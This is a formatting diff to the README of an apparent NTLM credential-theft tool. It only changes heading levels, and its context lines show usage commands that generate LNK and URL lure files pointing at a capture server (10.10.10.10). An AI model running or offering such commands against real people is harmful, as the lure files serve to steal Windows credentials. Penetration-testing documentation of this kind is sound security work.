@@ -84,7 +84,7 @@ Required parameters.
 
 ## Examples
 
-#### Create LNK file(s)
+### Create LNK file(s)
 
 ```plain
 $ python3 ntlm_theft.py -g lnk -s 10.10.10.10 -f generated-file    
@@ -92,7 +92,7 @@ Created: generated-file/generated-file.lnk (BROWSE TO FOLDER)
 Generation Complete.
 ```
 
-#### Create URL file(s)
+### Create URL file(s)
 
 ```plain
 $ python3 ntlm_theft.py -g url -s 10.10.10.10 -f generated-url  
